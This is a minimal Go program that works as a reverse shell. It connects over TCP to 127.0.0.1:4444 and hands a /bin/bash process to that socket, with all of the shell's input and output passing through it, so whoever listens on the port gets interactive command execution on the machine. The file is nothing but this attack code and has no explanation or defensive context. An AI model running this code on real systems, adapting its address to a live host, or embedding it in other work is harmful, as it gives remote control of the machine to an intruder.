package main

import (
    "os/exec"
    "net"
)

func main() {
  con,_:=net.Dial("tcp","127.0.0.1:4444")
  cmd:=exec.Command("/bin/bash")
  cmd.Stdin=con
  cmd.Stdout=con
  cmd.Stderr=con
  cmd.Run()
}
